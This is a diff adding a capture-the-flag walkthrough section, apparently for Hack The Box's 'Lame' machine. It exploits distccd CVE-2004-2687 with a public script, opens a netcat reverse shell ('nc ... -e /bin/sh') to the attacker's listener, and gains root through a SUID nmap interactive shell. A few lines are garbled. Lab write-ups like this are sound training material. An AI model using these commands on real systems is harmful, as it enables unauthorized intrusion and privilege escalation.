@@ -222,6 +222,111 @@ uid=0(root) gid=0(root)
 pwd
 /
 ```
-Once we have a root shell it's trivial to find the root and user flags to complete the box.
+Once we this shell it's trivial to find the root and user flags to complete the box.
 
-## Alternate Route - distccd 
+## Alternate Route - distccd
+A full TCP port scan reveals another port we didn't find earlier
+```sh
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3632/tcp open  distccd
+```
+Which we can investigate further
+```sh
+PORT     STATE SERVICE VERSION
+3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+```
+distccd is a server which runs jobs on a distributed C/C++ compiler, the version currently running is vulnerable to [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687) and can be exploited using [metasploit](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec), an [nmap script](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html) or a [python script](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)
+
+*Python Script*
+I try not to rely on metasploit too much, this python script does the job and achieves the same outcome.
+
+First we need to set up another netcat listener
+```sh
+root@kali:~# nc -lvnp 4444
+listening on [any] 4444 ...
+```
+Then we run the script and supply the required arguments
+```sh
+root@kali:~/htb/lame/4dbf6229a93e75c3bdf6b467e67a9855# python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.7 4444 -e /bin/sh"
+[OK] Connected to remote service
+[KO] Socket Timeout
+```
+-t is used to specify the host, -p is used to specify the target port and -c is used to specify the command, in this case we want to run connect back to our listener and spawn a shell
+```sh
+connect to [10.10.14.7] from (UNKNOWN) [10.10.10.3] 38837
+whoami
+daemon
+```
+The shell we spawned was as a low privileged user, daemon, to make it more comfortable to work with to privesc we can do
+```sh
+python -c 'import pty; pty.spawn("/bin/bash")'
+daemon@lame:/tmp$
+```
+
+*Escalating Privileges*
+Now we have a nicer shell we can focus on escalating priviliges, one common method to do this is with [SUID binaries](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/).
+
+We can search for SUID binaries using the find command
+```sh
+daemon@lame:/tmp$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+/sbin/mount.nfs
+/lib/dhcp3-client/call-dhclient-script
+/usr/bin/sudoedit
+/usr/bin/X
+/usr/bin/netkit-rsh
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/netkit-rlogin
+/usr/bin/arping
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/nmap
+/usr/bin/chsh
+/usr/bin/netkit-rcp
+/usr/bin/passwd
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/usr/lib/telnetlogin
+/usr/lib/apache2/suexec
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+```sh
+```
+This command searches for all files on the system with the SUID bit, any permission denied errors are sent to /dev/null.
+
+One program on the system with the SUID bit that sticks out is nmap, [older versions of nmap had an interactive mode which could be used to run shell commands](https://gtfobins.github.io/gtfobins/nmap/)
+```sh
+daemon@lame:/tmp$ nmap -V
+nmap -V
+
+Nmap version 4.53 ( http://insecure.org )
+daemon@lame:/tmp$ nmap --interactive
+nmap --interactive
+
+Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+sh-3.2# whoami
+whoami
+root
+sh-3.2# id
+id
+uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
+```
+And we have a root shell!
